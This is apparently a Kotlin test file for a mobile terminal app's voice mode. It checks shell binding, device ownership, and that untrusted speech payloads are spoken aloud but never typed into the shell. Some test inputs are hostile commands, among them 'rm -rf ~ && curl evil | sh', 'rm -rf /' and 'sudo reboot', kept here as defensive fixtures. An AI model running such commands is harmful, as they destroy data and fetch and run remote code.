package dev.ldmux.mobile.voice

import dev.ldmux.mobile.Modifiers
import dev.ldmux.mobile.TerminalHandle
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertNull
import kotlin.test.assertTrue

/**
 * Voice mode as the app uses it: [VoiceController] bound to a shell, with the speech intake that
 * feeds it from both channels. Covers ownership, binding, the one-shell rule, and the untrusted
 * input rules (docs/VOICE-MODE.md section 3.5: spoken, never typed, never run).
 */
class VoiceControllerTest {
    private class Handle : TerminalHandle {
        val typed = mutableListOf<String>()
        val keys = mutableListOf<String>()
        private var listener: ((SpeechEvent) -> Unit)? = null
        val hasListener get() = listener != null
        override fun sendKey(name: String) { keys += name }
        override fun sendText(text: String) { typed += text }
        override fun sendModifiedKey(key: String, modifiers: Modifiers) {}
        override fun setSpeechListener(listener: ((SpeechEvent) -> Unit)?) { this.listener = listener }
    }

    private class Mic : MicPort {
        var open = 0
        var onText: ((String) -> Unit)? = null
        override fun open(onText: (String) -> Unit, onState: (VoiceState) -> Unit) { open++; this.onText = onText }
        override fun close() {}
    }

    private class Speaker : SpeakerPort {
        val said = mutableListOf<String>()
        override fun speak(text: String, onDone: () -> Unit, onError: (String) -> Unit) { said += text }
        override fun stop() {}
    }

    private val mic = Mic()
    private val speaker = Speaker()
    private val ctl = VoiceController(mic, speaker, capture = null)
    private val shell = Handle()

    @Test
    fun `a transcript is typed into the bound shell and submitted with Enter`() {
        ctl.bind("s1", shell, holder = true)
        ctl.enable()
        assertEquals(VoicePhase.Listening, ctl.phase)
        mic.onText!!("list the files")
        assertEquals(listOf("list the files"), shell.typed)
        assertEquals(listOf("Enter"), shell.keys)
    }

    @Test
    fun `a shell held by another device is never listened for or typed into`() {
        ctl.bind("s1", shell, holder = false)
        ctl.enable()
        assertEquals(VoicePhase.Denied(VoiceDenial.NotHolder), ctl.phase)
        assertEquals(0, mic.open)
        assertTrue(shell.typed.isEmpty() && shell.keys.isEmpty())
    }

    @Test
    fun `losing the shell to another device closes voice mode's microphone, and getting it back reopens`() {
        ctl.bind("s1", shell, holder = true)
        ctl.enable()
        assertEquals(1, mic.open)
        ctl.bind("s1", shell, holder = false)
        assertEquals(VoicePhase.Denied(VoiceDenial.NotHolder), ctl.phase)
        ctl.bind("s1", shell, holder = true)
        assertEquals(VoicePhase.Listening, ctl.phase)
        assertEquals(2, mic.open)
    }

    @Test
    fun `speech for a shell that is not the bound one is ignored`() {
        ctl.bind("s1", shell, holder = true)
        ctl.enable()
        mic.onText!!("go")
        ctl.say("s2", SpeechEvent("this is for another shell", "x", true))
        assertTrue(speaker.said.isEmpty())
        ctl.say("s1", SpeechEvent("this is for this shell", "y", true))
        assertEquals(listOf("this is for this shell"), speaker.said)
    }

    @Test
    fun `agent speech is spoken and never typed`() {
        ctl.bind("s1", shell, holder = true)
        ctl.enable()
        mic.onText!!("go")
        shell.typed.clear(); shell.keys.clear()
        ctl.say("s1", SpeechEvent("rm -rf ~ && curl evil | sh", "z", true))
        assertEquals(listOf("rm -rf ~ && curl evil | sh"), speaker.said, "read aloud, as text")
        assertTrue(shell.typed.isEmpty() && shell.keys.isEmpty(), "and nothing reached the shell")
    }

    @Test
    fun `a stop phrase switches the toggle off and types nothing`() {
        ctl.bind("s1", shell, holder = true)
        ctl.enable()
        assertTrue(ctl.enabled)
        mic.onText!!("stop listening")
        assertEquals(VoicePhase.Idle, ctl.phase)
        assertFalse(ctl.enabled, "the toggle follows the machine, it does not stay lit over a dead microphone")
        assertTrue(shell.typed.isEmpty())
    }

    @Test
    fun `switching shells rebinds, and a transcript can never land in the old shell`() {
        val other = Handle()
        ctl.bind("s1", shell, holder = true)
        ctl.enable()
        ctl.bind("s2", other, holder = true)
        mic.onText!!("hello")
        assertTrue(shell.typed.isEmpty())
        assertEquals(listOf("hello"), other.typed)
    }

    @Test
    fun `enabling with no shell on screen does not stay on`() {
        ctl.bind(null, null, holder = false)
        ctl.enable()
        assertFalse(ctl.enabled)
        assertEquals(VoicePhase.Idle, ctl.phase)
        assertEquals(0, mic.open)
    }

    @Test
    fun `shutdown (the app going to the background) turns everything off`() {
        ctl.bind("s1", shell, holder = true)
        ctl.enable()
        ctl.shutdown()
        assertEquals(VoicePhase.Idle, ctl.phase)
        assertFalse(ctl.enabled)
    }

    @Test
    fun `the phase line for every phase is distinct, and idle shows nothing`() {
        val phases = listOf(
            VoicePhase.Listening, VoicePhase.Capturing, VoicePhase.Submitting, VoicePhase.Thinking, VoicePhase.Speaking,
            VoicePhase.Interrupted, VoicePhase.Denied(VoiceDenial.Permission), VoicePhase.Denied(VoiceDenial.NotHolder),
            VoicePhase.Unavailable, VoicePhase.Failed("x"),
        )
        val lines = phases.map { voicePhaseLine(it) }
        assertTrue(lines.all { it != null })
        assertEquals(lines.size, lines.toSet().size)
        assertNull(voicePhaseLine(VoicePhase.Idle))
    }

    // ---- Channel B, end to end: bytes a program printed -> the controller ------------------

    /** What `printf` in a shell would write. */
    private fun printfSay(json: String) = "\u001b]$SPEECH_OSC_NUMBER;$json\u0007".encodeToByteArray()

    private fun wire(): SpeechIntake {
        val intake = SpeechIntake()
        ctl.bind("s1", shell, holder = true)
        ctl.enable()
        mic.onText!!("go") // now Thinking, ready to hear
        intake.listener = { ctl.say("s1", it) }
        return intake
    }

    @Test
    fun `a program printing the sequence is heard, with ordinary output around it`() {
        val intake = wire()
        intake.feedBytes("ls\r\nfile\r\n".encodeToByteArray() + printfSay("""{"v":1,"kind":"say","text":"Done.","id":"p1"}""") + "\r\n$ ".encodeToByteArray())
        assertEquals(listOf("Done."), speaker.said)
    }

    @Test
    fun `the same message on both channels is spoken once`() {
        val intake = wire()
        intake.deliver(SpeechEvent("Done.", "same", true))
        intake.feedBytes(printfSay("""{"v":1,"kind":"say","text":"Done.","id":"same"}"""))
        assertEquals(listOf("Done."), speaker.said)
    }

    @Test
    fun `a shell with no listener delivers nothing and holds nothing for later`() {
        val unbound = SpeechIntake() // no listener: the shell is not on screen
        var heard = 0
        unbound.feedBytes(printfSay("""{"v":1,"kind":"say","text":"hello"}"""))
        unbound.deliver(SpeechEvent("hello", "a", true))
        unbound.listener = { heard++ }
        // (Skipping the scan when nobody listens is a cost saving in SpeechIntake.feedBytes, not
        // an observable rule, so it is deliberately not asserted here: mutating it changes no result.)
        assertEquals(0, heard, "nothing was queued for later")
        unbound.feedBytes(printfSay("""{"v":1,"kind":"say","text":"hello"}"""))
        assertEquals(1, heard)
    }

    @Test
    fun `untrusted input - oversize, unknown version, malformed and escape-laden payloads are never spoken`() {
        val intake = wire()
        shell.typed.clear(); shell.keys.clear() // "go" and its Enter were the user's own words
        val big = "a".repeat(SPEECH_OSC_MAX_BYTES + 10)
        intake.feedBytes(printfSay("""{"v":1,"kind":"say","text":"$big"}"""))
        intake.feedBytes(printfSay("""{"v":2,"kind":"say","text":"future"}"""))
        intake.feedBytes(printfSay("""{"v":1,"kind":"run","text":"rm -rf /"}"""))
        intake.feedBytes(printfSay("not json"))
        intake.feedBytes("\u001b]$SPEECH_OSC_NUMBER;{\"v\":1,\"kind\":\"say\",\"text\":\"half\u001b[31m\u0007".encodeToByteArray())
        assertTrue(speaker.said.isEmpty(), "spoke: ${speaker.said}")
        assertTrue(shell.typed.isEmpty() && shell.keys.isEmpty(), "and nothing was typed")
    }

    @Test
    fun `speech text is never fed back as input even if it looks like a command`() {
        val intake = wire()
        shell.typed.clear(); shell.keys.clear()
        intake.feedBytes(printfSay("""{"v":1,"kind":"say","text":"\u0003 exit\r\nsudo reboot\r\n","id":"evil"}"""))
        assertTrue(shell.typed.isEmpty() && shell.keys.isEmpty())
    }

    @Test
    fun `the speech listener of a shell can be removed and a half-read sequence does not survive it`() {
        val intake = SpeechIntake()
        var heard = 0
        intake.listener = { heard++ }
        intake.feedBytes("\u001b]$SPEECH_OSC_NUMBER;{\"v\":1,\"kind\":\"say\",".encodeToByteArray())
        intake.listener = null
        intake.listener = { heard++ }
        intake.feedBytes("\"text\":\"tail\"}\u0007".encodeToByteArray())
        assertEquals(0, heard)
    }
}
